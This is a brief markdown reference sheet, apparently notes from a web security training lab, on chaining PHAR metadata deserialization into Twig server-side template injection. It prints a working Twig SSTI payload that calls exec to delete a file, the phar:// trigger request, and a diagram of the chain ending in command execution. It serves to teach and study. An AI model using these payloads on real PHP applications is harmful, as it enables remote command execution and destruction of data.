# PHAR and SSTI Payload Reference

## Twig SSTI payload from the Academy lab

```text
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
```

## PHAR trigger

The lab ultimately requests:

```http
GET /cgi-bin/avatar.php?avatar=phar://wiener
```

## Concept

```text
Uploaded PHAR/JPG
        ↓
phar:// stream
        ↓
PHAR metadata deserialization
        ↓
Magic method
        ↓
Gadget chain
        ↓
Twig SSTI
        ↓
Command execution
```
